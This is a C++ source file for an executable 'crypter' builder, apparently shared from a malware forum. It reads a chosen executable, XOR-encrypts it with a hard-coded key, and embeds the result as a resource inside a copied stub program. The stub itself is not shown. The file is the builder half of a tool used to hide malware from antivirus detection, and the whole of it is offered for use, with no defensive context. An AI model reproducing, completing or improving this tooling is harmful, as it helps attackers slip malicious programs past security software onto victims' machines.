/** Credits and Research
*
* 	-orkourkou     (Original)
*	-DigitalNemesis 
	-Grigori Perelman
*   - Justin
*
*
**/


#include <iostream>
#include <Windows.h>
#include <fstream>
using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;
	wchar_t name[MAX_PATH]; // We will store the Name of the Crypted file here
	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	cout << "File Name: ";
	wcin >> name; // Ask for input from the user and store that inputed value in the name variable
	CopyFile(L"Stub.exe", L"Crypted.exe", 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever
	cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFile(name, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//^ Get the handle of the file to be crypted
	cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	cout << "The File Size is: ";
	cout << fs;
	cout << " Bytes\n";
	cout << "Allocating Memory for the ReadFile function\n";
	FB = new char[fs];// Allocate the exact ammount of space 
	cout << "Reading the file\n";
	ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)
	CloseHandle(efile);//close the handle
}
void enc() // The function that Encrypts the info on the FB buffer
{
	ofstream out("In Builder.txt");
	cout << "Encrypting the Data\n";
	char cipher[] = "penguin";
	for (int i = 0; i < fs; i++)
	{	
			FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
	}

	out.close();
}
void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	// Thanks to DigitalNemesis and Grigori Perelman  From www.OpenSC.ws
	cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}
int main() // The main function (Entry point)
{
	RDF();//Read the file
	enc();//Encrypt it 
	WriteToResources(L"Crypted.exe", 1, (BYTE *)FB, fs);//Write the encrypted data to resources
	cout << "Your File Got Crypted\n";
	system("PAUSE");
	//penguin
}